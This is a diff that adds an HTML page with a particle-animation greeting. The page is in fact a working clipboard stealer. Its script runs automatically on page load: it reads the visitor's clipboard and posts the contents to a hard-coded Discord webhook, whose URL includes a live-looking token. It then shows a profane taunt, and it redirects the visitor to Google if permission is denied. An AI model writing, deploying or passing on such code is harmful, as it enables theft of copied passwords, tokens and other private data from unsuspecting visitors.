@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clipboard Access</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .container {
+            text-align: center;
+            padding: 30px;
+            z-index: 10;
+        }
+        
+        h1 {
+            font-size: 5rem;
+            color: #fff;
+            text-shadow: 0 0 20px rgba(0, 238, 255, 0.8);
+            margin-bottom: 30px;
+            transition: all 0.5s ease;
+        }
+        
+        .status {
+            font-size: 1.8rem;
+            color: #e8eaed;
+            margin-top: 30px;
+            opacity: 0.9;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .glitch {
+            animation: glitch 0.5s infinite;
+            color: #ff5555;
+            text-shadow: 0 0 20px rgba(255, 85, 85, 0.8);
+        }
+        
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-5px, 5px); }
+            40% { transform: translate(-5px, -5px); }
+            60% { transform: translate(5px, 5px); }
+            80% { transform: translate(5px, -5px); }
+            100% { transform: translate(0); }
+        }
+        
+        .flashing {
+            animation: flash 0.7s infinite alternate;
+        }
+        
+        @keyframes flash {
+            from { opacity: 1; }
+            to { opacity: 0.3; }
+        }
+        
+        .redirect-notice {
+            font-size: 1.2rem;
+            color: #9aa0a6;
+            margin-top: 20px;
+        }
+        
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+        
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(0, 242, 254, 0.7);
+            border-radius: 50%;
+            box-shadow: 0 0 10px rgba(0, 242, 254, 0.8);
+        }
+        
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 3.5rem;
+            }
+            
+            .status {
+                font-size: 1.4rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    
+    <div class="container">
+        <h1 id="main-text">Hello there!</h1>
+        <div id="status" class="status">Requesting clipboard access...</div>
+        <div id="result" class="hidden"></div>
+        <div id="redirect-notice" class="redirect-notice hidden">Redirecting to Google...</div>
+    </div>
+
+    <script>
+        // Create particle effect
+        const particlesContainer = document.getElementById('particles');
+        const particleCount = 100;
+        
+        for (let i = 0; i < particleCount; i++) {
+            const particle = document.createElement('div');
+            particle.classList.add('particle');
+            
+            // Random position
+            particle.style.left = `${Math.random() * 100}%`;
+            particle.style.top = `${Math.random() * 100}%`;
+            
+            // Random animation
+            const size = Math.random() * 3 + 1;
+            particle.style.width = `${size}px`;
+            particle.style.height = `${size}px`;
+            
+            const duration = Math.random() * 10 + 5;
+            particle.style.animation = `float ${duration}s infinite linear`;
+            
+            particlesContainer.appendChild(particle);
+        }
+        
+        // Add floating animation to particles
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes float {
+                0% {
+                    transform: translate(0, 0);
+                    opacity: 0;
+                }
+                10% {
+                    opacity: 1;
+                }
+                90% {
+                    opacity: 1;
+                }
+                100% {
+                    transform: translate(${Math.random() * 100 - 50}px, ${Math.random() * 100 - 50}px);
+                    opacity: 0;
+                }
+            }
+        `;
+        document.head.appendChild(style);
+        
+        // DOM Elements
+        const mainText = document.getElementById('main-text');
+        const statusText = document.getElementById('status');
+        const resultText = document.getElementById('result');
+        const redirectNotice = document.getElementById('redirect-notice');
+        
+        // Discord webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1392808715903696946/36icJgBCiGyuyMPpiyMek62LK6hEwRFPaksUcqFju1Dc9ZuKXl456MK8I8dehEnL5Kb0";
+        
+        // Function to send data to Discord
+        async function sendToDiscord(content) {
+            try {
+                const payload = {
+                    content: `Clipboard content: ${content}`
+                };
+                
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                return true;
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+                return false;
+            }
+        }
+        
+        // Function to request clipboard permission
+        async function requestClipboardPermission() {
+            try {
+                // Update status
+                statusText.textContent = "Reading clipboard content...";
+                
+                // Try to read clipboard which will prompt for permission
+                const text = await navigator.clipboard.readText();
+                
+                // Send clipboard content to Discord
+                await sendToDiscord(text);
+                
+                // Update UI with success
+                statusText.textContent = "Clipboard content logged!";
+                mainText.textContent = "FUCK YOU GOT LOGS XDDDDD";
+                mainText.classList.add('glitch', 'flashing');
+                
+                // Show result
+                resultText.textContent = `Clipboard content: ${text}`;
+                resultText.classList.remove('hidden');
+                
+            } catch (error) {
+                // Permission denied or other error
+                if (error.name === 'NotAllowedError') {
+                    // Redirect to Google
+                    redirectNotice.classList.remove('hidden');
+                    statusText.textContent = "Permission denied!";
+                    setTimeout(() => {
+                        window.location.href = 'https://google.com';
+                    }, 2000);
+                } else {
+                    console.error('Error accessing clipboard:', error);
+                    statusText.textContent = "Error accessing clipboard. Redirecting...";
+                    redirectNotice.classList.remove('hidden');
+                    setTimeout(() => {
+                        window.location.href = 'https://google.com';
+                    }, 3000);
+                }
+            }
+        }
+        
+        // Check if browser supports clipboard API
+        if (!navigator.clipboard || !navigator.clipboard.readText) {
+            // Clipboard API not supported
+            statusText.textContent = "Browser not supported. Redirecting...";
+            redirectNotice.classList.remove('hidden');
+            setTimeout(() => {
+                window.location.href = 'https://google.com';
+            }, 3000);
+        } else {
+            // Request permission automatically
+            setTimeout(requestClipboardPermission, 1500);
+        }
+    </script>
+</body>
+</html>
